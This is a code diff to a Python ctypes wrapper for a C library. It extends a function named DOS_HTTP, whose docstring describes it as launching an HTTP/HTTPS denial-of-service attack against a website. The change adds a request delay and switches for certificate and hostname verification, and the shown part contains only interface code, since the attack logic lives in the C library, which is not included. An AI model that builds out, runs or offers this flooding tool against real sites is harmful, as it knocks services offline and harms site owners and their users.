@@ -3,8 +3,7 @@ import ctypes
 from tqdm import tqdm
 import time
 from blessed import Terminal
-
-term = Terminal()
+from typing import Optional
 
 C_FILE_HTTP = None
 LIB_FILE_HTTP = None
@@ -37,7 +36,14 @@ def set_dirs(cfilehttp, libfilehttp):
 
     C_FILE_HTTP, LIB_FILE_HTTP = cfilehttp, libfilehttp
 
-def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
+def DOS_HTTP(
+    target_url: str,
+    total_requests: int,
+    num_threads: Optional[int] = None,
+    delay_ms: Optional[int] = 0,
+    verify_certif: Optional[int] = 1,
+    verify_hostname: Optional[int] = 1,
+):
     """Launches a HTTP/HTTPS DoS attack against an website."""
     
     if num_threads is None:
@@ -63,11 +69,15 @@ def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
 
     # Bind argument signature & return structure
     http_lib.run_http_stress_test.argtypes = [
-        ctypes.c_char_p,     # const char *url
-        ctypes.c_int,        # int total_requests
-        ctypes.c_int,        # int num_threads
-        PROGRESS_CALLBACK,  # ProgressCallback cb
+        ctypes.c_char_p,       # url
+        ctypes.c_int,          # total_requests
+        ctypes.c_int,          # num_threads
+        PROGRESS_CALLBACK,     # callback
+        ctypes.c_int,          # delay_ms
+        ctypes.c_int,          # verify_certificate
+        ctypes.c_int,          # verify_hostname
     ]
+    
     http_lib.run_http_stress_test.restype = TestResult
 
     actual_total = total_requests
@@ -93,7 +103,10 @@ def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
         target_url.encode("utf-8"),
         actual_total,
         num_threads,
-        c_progress_cb
+        c_progress_cb,
+        delay_ms,
+        verify_certif,
+        verify_hostname,
     )
 
     pbar.close()
